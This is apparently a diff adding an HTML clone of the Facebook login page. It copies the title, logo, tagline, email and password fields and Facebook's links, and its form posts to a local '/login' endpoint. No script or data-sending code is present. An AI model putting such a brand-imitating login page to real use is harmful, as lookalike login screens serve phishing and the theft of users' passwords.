@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or Sign up</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="body">
+    <div>
+        <img class="logo" src="4lCu2zih0ca.svg" alt="Facebook Logo">
+    </div>
+
+    <div class="text">Facebook helps you connect and share with the people in your life</div>
+
+    <div>
+        <div class="login-container">
+            <form action="/login" method="POST"> <!-- Updated action to be more meaningful -->
+                <input type="text" class="Username" placeholder="Email address or phone number" required>
+                <br><br>
+                <input type="password" id="password" placeholder="Password" required>
+                <br><br>
+                <div>
+                    <button type="submit" class="login">Log in</button> <!-- Added type="submit" -->
+                </div>
+                <br>
+                <div>
+                    <!-- Updated hyperlink to link to a password reset page -->
+                    <a class="link" href="https://www.facebook.com/recover/initiate">Forgotten password?</a>
+                </div>
+
+                <div class="bits"></div>
+
+                <div>
+                    <a class="account" role="button" href="Createaccount.html">Create new account</a>
+                </div>
+            </form>
+        </div>
+
+        <br><br>
+
+        <div class="brand">
+            <a href="https://www.facebook.com/pages/create/" class="create">Create a Page</a> for a celebrity, brand, or business
+        </div>
+    </div>
+</body>
+</html>
